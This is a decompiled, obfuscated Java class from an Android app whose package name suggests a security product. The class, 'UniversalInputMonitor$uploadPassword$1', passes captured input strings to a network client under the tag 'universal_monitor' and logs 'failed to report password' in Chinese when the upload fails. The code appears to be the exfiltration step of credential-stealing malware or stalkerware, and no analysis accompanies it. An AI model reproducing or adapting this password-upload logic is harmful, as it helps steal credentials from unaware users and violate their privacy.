package com.storm.safe.rock.service.modules;

import com.storm.safe.rock.network.C0268a1;
import com.storm.safe.rock.service.dqtvuisjd;
import kotlin.Result;
import kotlin.coroutines.intrinsics.CoroutineSingletons;
import kotlin.coroutines.jvm.internal.SuspendLambda;
import p000.C1351vv;
import p000.InterfaceC0876mv;
import p000.InterfaceC0920no;
import p000.InterfaceC1116qn;
import p000.kg1;
import p000.l10;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
@InterfaceC1116qn(m214402c = "com.storm.safe.rock.service.modules.UniversalInputMonitor$uploadPassword$1", m214403f = "UniversalInputMonitor.kt", m214404l = {464}, m214405m = "invokeSuspend")
/* loaded from: classes2.dex */
final class UniversalInputMonitor$uploadPassword$1 extends SuspendLambda implements l10 {

    /* renamed from: a1 */
    public int f52888a1;

    /* renamed from: a2 */
    public final /* synthetic */ C0325b0 f52889a2;

    /* renamed from: a3 */
    public final /* synthetic */ String f52890a3;

    /* renamed from: a4 */
    public final /* synthetic */ String f52891a4;

    /* renamed from: a5 */
    public final /* synthetic */ String f52892a5;

    /* renamed from: a6 */
    public final /* synthetic */ String f52893a6;

    /* renamed from: a7 */
    public final /* synthetic */ int f52894a7;

    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
    public UniversalInputMonitor$uploadPassword$1(C0325b0 c0325b0, String str, String str2, String str3, String str4, int i, InterfaceC0876mv interfaceC0876mv) {
        super(2, interfaceC0876mv);
        this.f52889a2 = c0325b0;
        this.f52890a3 = str;
        this.f52891a4 = str2;
        this.f52892a5 = str3;
        this.f52893a6 = str4;
        this.f52894a7 = i;
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final InterfaceC0876mv create(Object obj, InterfaceC0876mv interfaceC0876mv) {
        return new UniversalInputMonitor$uploadPassword$1(this.f52889a2, this.f52890a3, this.f52891a4, this.f52892a5, this.f52893a6, this.f52894a7, interfaceC0876mv);
    }

    @Override // p000.l10
    public final Object invoke(Object obj, Object obj2) {
        return ((UniversalInputMonitor$uploadPassword$1) create((InterfaceC0920no) obj, (InterfaceC0876mv) obj2)).invokeSuspend(C1351vv.f60710b1);
    }

    @Override // kotlin.coroutines.jvm.internal.BaseContinuationImpl
    public final Object invokeSuspend(Object obj) throws Throwable {
        C0323a8 c0323a8M211471g5;
        C0268a1 c0268a1;
        CoroutineSingletons coroutineSingletons = CoroutineSingletons.f57606a0;
        int i = this.f52888a1;
        try {
        } catch (Exception e) {
            t60.m214705c6("UniversalInputMonitor", "上报密码失败", e);
        }
        if (i == 0) {
            kg1.m213544f4(obj);
            dqtvuisjd dqtvuisjdVar = this.f52889a2.f53147a0;
            C0268a1 c0268a12 = null;
            if (dqtvuisjdVar == null) {
                dqtvuisjdVar = null;
            }
            if (dqtvuisjdVar != null && (c0323a8M211471g5 = dqtvuisjdVar.m211471g5()) != null && (c0268a1 = c0323a8M211471g5.f53101a1) != null) {
                c0268a12 = c0268a1;
            }
            if (c0268a12 != null) {
                String str = this.f52890a3;
                String str2 = this.f52891a4;
                String str3 = this.f52892a5;
                String str4 = this.f52893a6;
                int i2 = this.f52894a7;
                this.f52888a1 = 1;
                if (c0268a12.m211377a7(str, str2, "universal_monitor", str3, str4, i2, this) == coroutineSingletons) {
                    return coroutineSingletons;
                }
            }
            return C1351vv.f60710b1;
        }
        if (i != 1) {
            throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
        }
        kg1.m213544f4(obj);
        Object obj2 = ((Result) obj).f57559a0;
        int i3 = Result.f57558a1;
        return C1351vv.f60710b1;
    }
}
